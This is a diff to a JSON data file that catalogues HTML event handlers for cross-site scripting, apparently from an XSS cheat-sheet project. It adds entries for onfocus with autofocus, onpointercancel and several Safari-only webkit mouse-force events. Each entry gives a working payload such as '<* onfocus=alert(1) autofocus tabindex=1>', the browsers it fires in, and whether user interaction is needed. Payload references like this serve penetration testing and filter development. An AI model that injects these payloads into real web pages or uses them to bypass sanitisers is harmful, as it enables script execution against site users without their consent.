@@ -9441,7 +9441,7 @@
     },
     "onwebkitplaybacktargetavailabilitychanged": {
         "description": "Fires when the availability of an AirPlay playback target changes",
-	"tags": [
+	    "tags": [
             {
                 "tag": "audio",
                 "code": "<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>",
@@ -9449,7 +9449,7 @@
                     "safari"
                 ],
                 "interaction": false
-	    },
+            },
             {
                 "tag": "video",
                 "code": "<video onwebkitplaybacktargetavailabilitychanged=alert(1)>",
@@ -9457,7 +9457,102 @@
                     "safari"
                 ],
                 "interaction": false
-	    }
-	]
+            }
+	    ]
+    },
+    "onfocus(autofocus)": {
+        "description": "Fires when a element has focus and the autofocus attribute is used to focus automatically.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onfocus=alert(1) autofocus tabindex=1>",
+                "browsers": [
+                    "chrome",
+                    "firefox",
+                    "safari"
+                ],
+                "interaction": false
+            }
+        ]
+    },
+    "onpointercancel": {
+        "description": "You need to make a selection and drag the text using a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onpointercancel=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "chrome",
+                    "firefox",
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onwebkitmouseforcechanged": {
+        "description": "Requires a click from a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onwebkitmouseforcechanged=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onwebkitmouseforcewillbegin": {
+        "description": "Requires a click from a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onwebkitmouseforcewillbegin=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onwebkitmouseforceup": {
+        "description": "Requires a click from a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onwebkitmouseforceup=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onwebkitmouseforcedown": {
+        "description": "Requires a click from a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onwebkitmouseforcedown=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onwebkitwillrevealbottom": {
+        "description": "Requires a click from a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onwebkitwillrevealbottom=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
     }
 }
